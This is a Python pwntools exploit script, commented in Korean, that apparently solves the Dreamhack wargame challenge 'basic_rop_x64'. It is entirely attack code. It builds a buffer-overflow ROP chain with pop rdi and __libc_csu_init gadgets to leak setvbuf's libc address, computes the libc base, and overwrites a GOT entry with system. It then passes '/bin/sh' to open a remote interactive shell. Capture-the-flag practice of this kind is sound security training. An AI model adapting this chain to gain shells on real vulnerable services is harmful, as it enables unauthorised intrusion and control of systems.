from pwn import *

def __libc_csu_init_chaining(rdi, rsi, rdx, func):
    payload = p64(0x0)  #add rsp, 8이므로 의미없는값 추가
    payload += p64(0x0)    #pop rbx
    payload += p64(0x1)    #pop rbp
    payload += p64(func)    #pop r12, 실행하고싶은 함수 주소가 저장된 주소
    payload += p64(rdx)    #pop r13, rdx
    payload += p64(rsi)    #pop r14, rsi
    payload += p64(rdi)    #pop r15, edi
    payload += p64(0x400860)    #retn
    return payload

#p=process("./basic_rop_x64")
p=remote("host3.dreamhack.games", 23363)
e=ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

puts_plt = e.plt["puts"]
puts_got = e.got["puts"]
read_got = e.got["read"]
setvbuf_got = e.got["setvbuf"]

pop_rdi = 0x0000000000400883
payload = b"A"*0x48
#puts()
payload += p64(pop_rdi) + p64(setvbuf_got) + p64(puts_plt)

payload += p64(0x400876)    #리턴주소 -> libc_csu_init시작주소
payload += __libc_csu_init_chaining(0, setvbuf_got, 0x100, read_got)
payload += __libc_csu_init_chaining(setvbuf_got+0x8, 0x0, 0x0, setvbuf_got)

print("setvbuf_got: "+str(hex(setvbuf_got)))
p.send(payload)

p.recvuntil(b"A"*0x40)
setvbuf = u64(p.recvn(6)+b"\x00"*2)
lb = setvbuf - libc.symbols["setvbuf"]
system = lb + libc.symbols["system"]
read = lb + libc.symbols["read"]
print("setvbuf address: "+str(hex(setvbuf)))
print("base address: "+str(hex(lb)))
print("system address: "+str(hex(system)))
print("read address: "+str(hex(read)))
p.recvn(1)
p.send(p64(system)+b"/bin/sh\x00")

p.interactive()